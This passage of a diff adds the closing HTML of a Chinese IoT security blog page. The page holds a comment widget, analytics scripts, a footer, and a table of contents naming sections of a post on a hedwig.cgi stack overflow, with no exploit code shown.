+		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
+		<script type="text/javascript">
+		   (function(d, s) {
+		       var j, e = d.getElementsByTagName(s)[0];
+
+		       if (typeof LivereTower === 'function') { return; }
+
+		       j = d.createElement(s);
+		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+		       j.async = true;
+
+		       e.parentNode.insertBefore(j, e);
+		   })(document, 'script');
+		</script>
+		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+		</div>
+		<!-- City版安装代码已完成 -->
+	</div>
+
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2017/09/27/Awesome-IoT-Hacks/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Neuer</strong>
+      <div class="article-nav-title">
+        
+          Awesome IoT Hacks
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/09/27/路由器固件安全分析技术-一/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Älter</strong>
+      <div class="article-nav-title">路由器固件安全分析技术(一)</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+<!-- Table of Contents -->
+
+  <aside id="sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">Contents</strong>
+    
+      <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#分析环境"><span class="nav-number">2.</span> <span class="nav-text">分析环境</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞描述"><span class="nav-number">3.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#hedwig-cgi栈溢出漏洞分析"><span class="nav-number">4.</span> <span class="nav-text">hedwig.cgi栈溢出漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#sobj类函数逆向分析"><span class="nav-number">4.1.</span> <span class="nav-text">sobj类函数逆向分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sess-get-uid函数逆向分析"><span class="nav-number">4.2.</span> <span class="nav-text">sess_get_uid函数逆向分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞利用"><span class="nav-number">5.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考资料"><span class="nav-number">6.</span> <span class="nav-text">参考资料</span></a></li></ol>
+    
+    </div>
+  </aside>
+</section>
+        
+      </div>
+      <footer id="footer" class="site-footer">
+  
+
+  <div class="clearfix container">
+      <div class="site-info">
+	      &copy; 2017 物联网安全技术研究 All Rights Reserved.
+          
+            <span id="busuanzi_container_site_uv">
+              本站访客数<span id="busuanzi_value_site_uv"></span>人次  
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+            </span>
+          
+      </div>
+      <div class="site-credit">
+        Theme by <a href="https://github.com/iTimeTraveler/hexo-theme-hiero" target="_blank">hiero</a>
+      </div>
+  </div>
+</footer>
+
+
+<!-- min height -->
+
+<script>
+    var contentdiv = document.getElementById("content");
+
+    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
+</script>
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/主页" class="mobile-nav-link">Home</a>
+  
+    <a href="/书籍" class="mobile-nav-link">books</a>
+  
+    <a href="/工具" class="mobile-nav-link">tools</a>
+  
+    <a href="/关于我们" class="mobile-nav-link">about</a>
+  
+</nav> -->
+    
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/scripts.js"></script>
+<script src="/js/bootstrap.js"></script>
+<script src="/js/main.js"></script>
+
+
+
+
+
+
+
+  <div style="display: none;">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+  </div>
+
+
+
+	<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+	</script>
+
+
+
+
+
+
+  </div>
+
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js" async=""></script>
+</body>
+</html>
